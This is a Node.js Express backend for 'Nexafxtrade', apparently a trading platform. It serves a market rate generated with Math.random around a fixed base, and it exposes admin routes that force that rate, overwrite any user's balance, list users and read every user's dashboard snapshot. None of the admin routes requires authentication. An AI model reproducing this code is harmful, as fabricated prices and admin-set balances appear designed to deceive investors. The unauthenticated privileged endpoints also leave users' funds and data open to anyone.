/**
 * Nexafxtrade Backend Engine (Vercel Serverless Premium Edition)
 * Version: 5.3.0 (Full Dashboard Live-Monitoring Enabled)
 * Brand: Nexafxtrade
 */

// ================= IMPORTS =================
require("dotenv").config();
const crypto = require("crypto");
const express = require("express");
const cors = require("cors");
const jwt = require("jsonwebtoken");
const axios = require("axios");
const path = require("path");
const mongoose = require("mongoose");
const bcrypt = require("bcryptjs");

const connectDB = require("./config/db");

// ================= MODELS =================
const User = require("./models/User");

// Simple schema inline to store admin-controlled market overrides if not already defined
const AdminControlSchema = new mongoose.Schema({
    key: { type: String, required: true, unique: true },
    value: mongoose.Schema.Types.Mixed
}, { timestamps: true });

// NEW: Schema for capturing live dashboard states
const DashboardSnapshotSchema = new mongoose.Schema({
    userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true, unique: true },
    userName: String,
    dashboardData: mongoose.Schema.Types.Mixed,
    lastUpdate: { type: Date, default: Date.now }
});

const AdminControl = mongoose.models.AdminControl || mongoose.model("AdminControl", AdminControlSchema);
const DashboardSnapshot = mongoose.models.DashboardSnapshot || mongoose.model("DashboardSnapshot", DashboardSnapshotSchema);

const app = express();

/**
 * =========================================
 * CORS & PREFLIGHT WIRE ROUTING (FIXED)
 * =========================================
 */
const allowedOrigins = [
    "http://localhost:3000",
    "http://localhost:5000",
    "http://localhost:3001",
    "http://127.0.0.1:5500"
];

app.use(cors({
    origin: function (origin, callback) {
        if (!origin) return callback(null, true);
        if (allowedOrigins.indexOf(origin) !== -1) return callback(null, true);
        if (origin.includes("vercel.app") || origin.includes("nexafxtrade.com")) return callback(null, true);
        return callback(new Error("Not allowed by CORS engine"));
    },
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization", "X-API-Key"],
    credentials: true
}));

app.options("*", (req, res) => {
    res.setHeader("Access-Control-Allow-Origin", req.headers.origin || "*");
    res.setHeader("Access-Control-Allow-Methods", "GET,POST,PUT,DELETE,OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type,Authorization,X-API-Key");
    res.setHeader("Access-Control-Allow-Credentials", "true");
    return res.sendStatus(200);
});

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static(path.join(__dirname, "public")));

/**
 * =========================================
 * VERCEL-COMPATIBLE DATABASE MIDDLEWARE
 * =========================================
 */
let dbConnectPromise = null;

app.use(async (req, res, next) => {
    try {
        if (mongoose.connection.readyState !== 1) {
            if (!dbConnectPromise) {
                dbConnectPromise = connectDB();
            }
            await dbConnectPromise;
        }
        next();
    } catch (err) {
        console.error("❌ Middleware Database Connection Failure:", err.message);
        return res.status(500).json({ error: "Database connectivity error." });
    }
});

/**
 * =========================================
 * DATABASE CONNECTION (TRADITIONAL INSTANCE RUNTIME)
 * =========================================
 */
if (!process.env.VERCEL) {
    connectDB()
        .then(() => {
            console.log("\n=======================================");
            console.log("🚀 NEXAFXTRADE ENGINE ONLINE");
            console.log("=======================================\n");
        })
        .catch(err => {
            console.log("❌ MongoDB Connection Error:", err.message);
        });
}

/**
 * =========================================
 * AUTH MIDDLEWARE
 * =========================================
 */
function auth(req, res, next) {
    try {
        const header = req.headers.authorization;
        if (!header) return res.status(401).json({ error: "Access denied. No token provided." });
        
        const token = header.split(" ")[1];
        if (!token) return res.status(401).json({ error: "Invalid authorization token" });
        
        req.user = jwt.verify(token, process.env.JWT_SECRET);
        next();
    } catch (err) {
        return res.status(401).json({ error: "Invalid or expired token" });
    }
}

/**
 * =========================================
 * NEW: LIVE DASHBOARD SYNC & MONITORING
 * =========================================
 */

// User pushes their full dashboard state (graph, features, etc)
app.post("/api/dashboard/sync", auth, async (req, res) => {
    try {
        const { dashboardData } = req.body;
        await DashboardSnapshot.findOneAndUpdate(
            { userId: req.user.id },
            { 
                userId: req.user.id, 
                userName: req.user.name, 
                dashboardData,
                lastUpdate: Date.now() 
            },
            { upsert: true, new: true }
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Failed to sync dashboard state" });
    }
});

// Admin fetches all live snapshots
app.get("/api/admin/live-monitor", async (req, res) => {
    try {
        const snapshots = await DashboardSnapshot.find({}).sort({ lastUpdate: -1 });
        res.json(snapshots);
    } catch (err) {
        res.status(500).json({ error: "Failed to fetch live monitors" });
    }
});

/**
 * =========================================
 * EXISTING ADMINISTRATIVE INTERFACES
 * =========================================
 */

app.get("/api/admin/users", async (req, res) => {
    try {
        const users = await User.find({}).select("-password").sort({ createdAt: -1 });
        res.json(users);
    } catch (error) {
        res.status(500).json({ error: "Failed to retrieve users" });
    }
});

app.put("/api/admin/user/balance-override", async (req, res) => {
    try {
        const { userId, targetBalance } = req.body;
        const user = await User.findById(userId);
        if (!user) return res.status(404).json({ error: "User not found" });

        user.balance = parseFloat(targetBalance);
        await user.save();
        res.json({ success: true, updatedBalance: user.balance });
    } catch (error) {
        res.status(500).json({ error: "Failed to modify balance" });
    }
});

app.post("/api/admin/market/override", async (req, res) => {
    try {
        const { forcedRate } = req.body;
        await AdminControl.findOneAndUpdate({ key: "market_rate_override" }, { value: parseFloat(forcedRate) }, { upsert: true });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: "Failed to pin market trend" });
    }
});

app.delete("/api/admin/market/override", async (req, res) => {
    try {
        await AdminControl.deleteOne({ key: "market_rate_override" });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: "Failed to clear price rule" });
    }
});

/**
 * =========================================
 * OTHER ROUTES (PRESERVED)
 * =========================================
 */
app.use("/api/auth", require("./routes/Auth"));
app.use("/api/payments", require("./routes/paymentRoutes"));
app.use("/api/user", require("./routes/User"));

app.get("/api/market/rate", async (req, res) => {
    try {
        const override = await AdminControl.findOne({ key: "market_rate_override" });
        if (override && override.value) return res.json({ rate: override.value });
        
        const baseRate = 8421500; 
        const dynamicShift = (Math.random() - 0.48) * (8500 / 15);
        res.json({ rate: Math.floor(baseRate + dynamicShift) });
    } catch (error) {
        res.json({ rate: 8421500 });
    }
});

app.get("/", (req, res) => {
    res.json({ status: "online", brand: "Nexafxtrade", version: "5.3.0" });
});

if (!process.env.VERCEL) {
    const PORT = process.env.PORT || 5000;
    app.listen(PORT, () => console.log(`🚀 NEXAFXTRADE RUNNING ON PORT ${PORT}`));
}

module.exports = app;
